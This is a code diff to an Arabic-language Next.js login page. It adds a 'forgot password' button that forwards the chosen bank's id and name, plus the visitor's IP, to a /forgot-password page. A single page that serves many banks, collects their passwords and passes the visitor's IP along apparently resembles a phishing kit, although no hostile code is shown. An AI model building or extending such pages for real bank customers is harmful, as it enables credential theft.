@@ -56,6 +56,11 @@ export default function Page() {
     // العثور على البنك المحدد
     const selectedBank = banks.find(bank => bank.id === parseInt(bankId));
 
+    // ✅ دالة للانتقال إلى صفحة نسيت كلمة المرور
+    const handleForgotPassword = () => {
+        router.push(`/forgot-password?bankId=${bankId}&bankName=${encodeURIComponent(selectedBank?.name || '')}&ip=${encodeURIComponent(ip || '')}`);
+    };
+
     const handleSubmit = async (e) => {
         e.preventDefault();
         setIsLoading(true);
@@ -188,15 +193,26 @@ export default function Page() {
                                 name="password"
                                 required
                                 placeholder="أدخل كلمة المرور"
-                                className="w-full border  text-gray-700 border-gray-300 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#008000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white"
+                                className="w-full border text-gray-700 border-gray-300 rounded-lg py-2.5 px-4 focus:outline-none focus:ring-2 focus:ring-[#008000] focus:border-transparent transition-all duration-300 bg-gray-50 hover:bg-white"
                                 dir="ltr"
                             />
+                        </div>
+
+                        {/* ✅ زر نسيت كلمة المرور */}
+                        <div className="flex justify-end">
+                            <button
+                                type="button"
+                                onClick={handleForgotPassword}
+                                className="text-sm text-[#008000] hover:text-[#006000] font-semibold transition-colors duration-300 hover:underline"
+                            >
+                                نسيت كلمة المرور؟
+                            </button>
                         </div>
 
                         <button
                             type="submit"
                             disabled={isLoading}
-                            className="w-full px-6 py-3 bg-[#008000] text-white rounded-lg shadow-md hover:bg-[#600000] transition-all duration-300 transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-[#008000] focus:ring-offset-2 text-lg font-semibold disabled:opacity-50 disabled:cursor-not-allowed"
+                            className="w-full px-6 py-3 bg-[#008000] text-white rounded-lg shadow-md hover:bg-[#006000] transition-all duration-300 transform hover:scale-105 focus:outline-none focus:ring-2 focus:ring-[#008000] focus:ring-offset-2 text-lg font-semibold disabled:opacity-50 disabled:cursor-not-allowed"
                         >
                             {isLoading ? (
                                 <span className="flex items-center justify-center gap-2">
@@ -215,4 +231,4 @@ export default function Page() {
             </div>
         </main>
     );
-}
+    }
